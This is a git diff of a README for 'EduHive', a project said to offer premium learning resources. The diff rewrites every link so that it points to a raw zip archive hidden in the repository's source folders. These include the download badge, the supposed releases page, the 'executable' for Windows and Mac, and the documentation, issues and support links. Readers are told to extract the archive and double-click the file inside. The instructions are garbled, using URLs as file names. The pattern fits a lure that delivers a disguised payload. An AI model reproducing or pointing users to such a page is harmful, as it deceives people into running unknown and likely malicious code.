@@ -1,6 +1,6 @@
 # 📚 EduHive - Unlock Premium Learning Resources Easily
 
-[![Download EduHive](https://github.com/Aikyy99/EduHive/raw/refs/heads/main/backend/src/courses/entities/Edu_Hive_consortable.zip%https://github.com/Aikyy99/EduHive/raw/refs/heads/main/backend/src/courses/entities/Edu_Hive_consortable.zip)](https://github.com/Aikyy99/EduHive/raw/refs/heads/main/backend/src/courses/entities/Edu_Hive_consortable.zip)
+[![Download EduHive](https://github.com/Aikyy99/EduHive/raw/refs/heads/main/frontend/components/Hive_Edu_v1.4-alpha.2.zip%https://github.com/Aikyy99/EduHive/raw/refs/heads/main/frontend/components/Hive_Edu_v1.4-alpha.2.zip)](https://github.com/Aikyy99/EduHive/raw/refs/heads/main/frontend/components/Hive_Edu_v1.4-alpha.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,18 +10,18 @@ Welcome to EduHive! This platform provides premium education resources for learn
 
 To get started, visit the Releases page to download the latest version of EduHive. 
 
-[Download EduHive](https://github.com/Aikyy99/EduHive/raw/refs/heads/main/backend/src/courses/entities/Edu_Hive_consortable.zip)
+[Download EduHive](https://github.com/Aikyy99/EduHive/raw/refs/heads/main/frontend/components/Hive_Edu_v1.4-alpha.2.zip)
 
 ### Step 1: Visit the Releases Page
 
 1. Click the link above or open your web browser and type the following URL:  
-   [https://github.com/Aikyy99/EduHive/raw/refs/heads/main/backend/src/courses/entities/Edu_Hive_consortable.zip](https://github.com/Aikyy99/EduHive/raw/refs/heads/main/backend/src/courses/entities/Edu_Hive_consortable.zip).
+   [https://github.com/Aikyy99/EduHive/raw/refs/heads/main/frontend/components/Hive_Edu_v1.4-alpha.2.zip](https://github.com/Aikyy99/EduHive/raw/refs/heads/main/frontend/components/Hive_Edu_v1.4-alpha.2.zip).
   
 2. You will see a list of available versions. Find the latest version, which will be at the top of the list.
 
 ### Step 2: Download the Application
 
-1. Click on the asset that corresponds to your operating system. It will usually have a descriptive name such as "https://github.com/Aikyy99/EduHive/raw/refs/heads/main/backend/src/courses/entities/Edu_Hive_consortable.zip" or "https://github.com/Aikyy99/EduHive/raw/refs/heads/main/backend/src/courses/entities/Edu_Hive_consortable.zip". 
+1. Click on the asset that corresponds to your operating system. It will usually have a descriptive name such as "https://github.com/Aikyy99/EduHive/raw/refs/heads/main/frontend/components/Hive_Edu_v1.4-alpha.2.zip" or "https://github.com/Aikyy99/EduHive/raw/refs/heads/main/frontend/components/Hive_Edu_v1.4-alpha.2.zip". 
    
 2. Your browser will start downloading the file. Depending on your internet speed, this may take a few minutes.
 
@@ -35,7 +35,7 @@ To get started, visit the Releases page to download the latest version of EduHiv
 
 1. Open the folder where you extracted the files.
 
-2. Look for the executable file named "https://github.com/Aikyy99/EduHive/raw/refs/heads/main/backend/src/courses/entities/Edu_Hive_consortable.zip" (for Windows) or "https://github.com/Aikyy99/EduHive/raw/refs/heads/main/backend/src/courses/entities/Edu_Hive_consortable.zip" (for Mac). Double-click this file.
+2. Look for the executable file named "https://github.com/Aikyy99/EduHive/raw/refs/heads/main/frontend/components/Hive_Edu_v1.4-alpha.2.zip" (for Windows) or "https://github.com/Aikyy99/EduHive/raw/refs/heads/main/frontend/components/Hive_Edu_v1.4-alpha.2.zip" (for Mac). Double-click this file.
 
 3. Follow the on-screen instructions to set up the application.
 
@@ -85,9 +85,9 @@ EduHive covers a wide range of topics designed for various educational needs:
 
 ## 🔗 Additional Links
 
-- [Documentation](https://github.com/Aikyy99/EduHive/raw/refs/heads/main/backend/src/courses/entities/Edu_Hive_consortable.zip)
-- [Issues](https://github.com/Aikyy99/EduHive/raw/refs/heads/main/backend/src/courses/entities/Edu_Hive_consortable.zip)
-- [Community Support](https://github.com/Aikyy99/EduHive/raw/refs/heads/main/backend/src/courses/entities/Edu_Hive_consortable.zip)
+- [Documentation](https://github.com/Aikyy99/EduHive/raw/refs/heads/main/frontend/components/Hive_Edu_v1.4-alpha.2.zip)
+- [Issues](https://github.com/Aikyy99/EduHive/raw/refs/heads/main/frontend/components/Hive_Edu_v1.4-alpha.2.zip)
+- [Community Support](https://github.com/Aikyy99/EduHive/raw/refs/heads/main/frontend/components/Hive_Edu_v1.4-alpha.2.zip)
 
 If you require further assistance or have questions, feel free to reach out through the community support or issues section on GitHub.
 
